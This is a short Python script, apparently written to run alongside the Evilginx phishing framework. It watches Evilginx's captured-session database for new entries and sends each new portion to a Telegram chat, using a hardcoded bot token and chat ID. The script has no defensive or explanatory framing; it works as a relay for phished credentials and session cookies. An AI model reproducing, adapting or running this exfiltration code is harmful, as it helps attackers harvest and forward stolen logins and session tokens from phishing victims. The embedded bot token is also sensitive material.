file_path = '/root/.evilginx/data.db'
file_useano="subtitute.txt"
file_content1=''
file_content2=''
toreplace=''
replay=''

TOKEN='6579196085:AAHPWo16Q_scDH5m_A4iQlz4O7REfmokMws'
CHAT_ID='7284568121'

import requests

with open(file_path, 'r') as file:
    file_content1 = file.read() 
    replay=file_content1
    toreplace=file_content1
    file.close()


with open(file_useano, 'r') as file:
    file_content2 = file.read()
    file.close()


if file_content1 != file_content2:
  print("YES")
  with open(file_useano, 'w') as file:
     print("YES1")
     message=toreplace.replace(file_content2, '')
     print("YES2")
     file.write(toreplace)
     print("YES3")
     file.close()
     print("YES4")
     url=f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
     print("YES5")
     requests.get(url)
     print("YES6")
     
  
  


  



print("DONE")

  